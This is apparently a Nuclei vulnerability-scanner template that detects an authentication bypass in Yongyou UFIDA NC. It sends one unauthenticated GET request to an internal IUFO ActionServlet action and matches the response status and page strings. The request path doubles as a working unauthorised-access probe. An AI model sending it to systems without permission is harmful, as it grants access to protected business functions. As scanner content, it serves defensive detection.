id: yongyou-ufida-nc-authentication-bypass
info:
  name: Yongyou UFIDA NC Authentication Bypass
  author: ProjectDiscoveryAI
  severity: high
  tags: unauthorized-access, ufida-nc
http:
  - method: GET
    path:
      - "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID="
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "发布 - IUFO"
          - "/iufo/web/images/clocks.gif"
